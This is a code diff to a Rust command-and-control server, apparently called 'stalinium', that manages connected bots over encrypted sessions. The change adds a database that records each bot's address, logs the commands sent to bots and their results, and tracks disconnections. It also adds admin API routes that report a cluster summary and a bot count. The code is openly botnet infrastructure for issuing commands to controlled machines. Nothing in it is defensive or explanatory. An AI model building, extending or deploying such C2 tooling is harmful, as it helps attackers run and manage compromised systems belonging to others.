@@ -8,6 +8,7 @@ mod error;
 mod p2p;
 mod agentic;
 mod persistence;
+mod db;
 
 use std::collections::HashMap;
 use std::net::SocketAddr;
@@ -23,6 +24,7 @@ use axum::{
 };
 use commands::{Command, CommandResult};
 use config::Config;
+use db::ServerDb;
 use error::C2Error;
 use serde::{Deserialize, Serialize};
 use tokio::net::TcpListener;
@@ -32,6 +34,7 @@ pub struct AppState {
     bots: RwLock<HashMap<SocketAddr, BotHandle>>,
     results: RwLock<Vec<ResultEntry>>,
     config: Config,
+    db: ServerDb,
 }
 
 struct BotHandle {
@@ -111,6 +114,24 @@ async fn get_results(State(state): State<Arc<AppState>>) -> Json<Vec<ResultInfo>
     Json(infos)
 }
 
+async fn cluster_summary_handler(
+    State(state): State<Arc<AppState>>,
+) -> Json<serde_json::Value> {
+    match state.db.cluster_summary() {
+        Ok(summary) => Json(serde_json::to_value(summary).unwrap_or_default()),
+        Err(e) => Json(serde_json::json!({"error": e.to_string()})),
+    }
+}
+
+async fn bot_count_handler(
+    State(state): State<Arc<AppState>>,
+) -> Json<serde_json::Value> {
+    match state.db.bot_count() {
+        Ok(count) => Json(serde_json::json!({"connected": count})),
+        Err(e) => Json(serde_json::json!({"error": e.to_string()})),
+    }
+}
+
 async fn handle_bot(
     mut socket: tokio::net::TcpStream,
     addr: SocketAddr,
@@ -126,6 +147,8 @@ async fn handle_bot(
     let key = handshake.session_key;
 
     let (tx, mut rx) = mpsc::channel::<Command>(32);
+
+    let _ = state.db.upsert_bot(&addr.to_string());
 
     state.bots.write().await.insert(addr, BotHandle {
         addr,
@@ -150,6 +173,12 @@ async fn handle_bot(
                 match encryption::recv_encrypted(&mut socket, &key).await {
                     Ok(data) => {
                         if let Ok(result) = serde_json::from_slice::<CommandResult>(&data) {
+                            let _ = state.db.insert_result(
+                                Some(cmd.id as i64),
+                                &addr.to_string(),
+                                &cmd.command,
+                                &result.result,
+                            );
                             state.results.write().await.push(ResultEntry {
                                 bot_addr: addr,
                                 command: cmd.command,
@@ -165,6 +194,7 @@ async fn handle_bot(
         }
     }
 
+    let _ = state.db.disconnect_bot(&addr.to_string());
     state.bots.write().await.remove(&addr);
     eprintln!("[-] Bot disconnected: {}", addr);
 }
@@ -212,10 +242,14 @@ async fn main() -> Result<(), C2Error> {
         });
     }
 
+    let db = ServerDb::open("stalinium_server.db")
+        .expect("Failed to open server database");
+
     let state = Arc::new(AppState {
         bots: RwLock::new(HashMap::new()),
         results: RwLock::new(Vec::new()),
         config,
+        db,
     });
 
     let admin_state = state.clone();
@@ -225,6 +259,8 @@ async fn main() -> Result<(), C2Error> {
             .route("/api/bots", get(list_bots))
             .route("/api/command", post(send_command_handler))
             .route("/api/results", get(get_results))
+            .route("/api/cluster", get(cluster_summary_handler))
+            .route("/api/bot_count", get(bot_count_handler))
             .with_state(admin_state);
 
         let listener = TcpListener::bind(&admin_addr).await.unwrap();
